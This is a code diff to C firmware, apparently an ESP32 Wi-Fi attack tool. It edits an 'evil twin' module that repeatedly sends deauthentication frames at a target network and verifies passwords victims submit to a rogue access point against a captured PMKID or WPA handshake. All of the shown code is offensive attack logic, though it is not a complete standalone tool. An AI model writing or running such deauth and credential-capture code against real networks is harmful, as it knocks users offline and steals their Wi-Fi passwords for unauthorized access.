@@ -21,7 +21,7 @@ static void evil_twin_task(void *pvParameters)
     vTaskDelay(pdMS_TO_TICKS(1000));
 
     /* Stop admin server TODO: Verificare se possibile lasciarlo attivo se non usa troppa ram */
-    http_admin_server_stop();
+    //http_admin_server_stop();
 
     /* Get target information */
     /*Try guess by ssid */
@@ -59,7 +59,7 @@ static void evil_twin_task(void *pvParameters)
     {
         wifi_attack_deauth_basic();
         wifi_attack_deauth_ap_eapol_logoff();
-        wifi_attack_deauth_client_negative_tx_power();
+        //wifi_attack_deauth_client_negative_tx_power();
         vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
@@ -75,6 +75,9 @@ void evil_twin_start_attack(target_info_t *targe_info)
 
     memcpy(&target, targe_info, sizeof(target_info_t));
     xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 5, &evil_twin_task_handle);
+
+    ESP_LOGI(TAG, "Evil-Twin attack started.");
+    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target.ssid, target.channel);
 }
 
 
@@ -107,6 +110,8 @@ void evil_twin_stop_attack(void)
 
     /* Start Admin server */
     http_admin_server_start();
+
+    ESP_LOGI(TAG, "Evil-Twin attack stopped.");
 }
 
 
@@ -114,16 +119,17 @@ bool evil_twin_check_password(char *password)
 {
     handshake_info_t *handshake = wifi_attack_engine_handshake();
 
+    bool handshake_test = false;
+    bool pmkid_test = false;
+
     if( handshake->pmkid_captured == true )
     {
-        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
+        pmkid_test = verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
     }
-    else if( handshake->handshake_captured == true )
+    if( handshake->handshake_captured == true )
     {
-        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
+        handshake_test = verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
     }
-    else
-    {
-        return false;
-    }
+    
+    return (handshake_test == true || pmkid_test == true);
 }
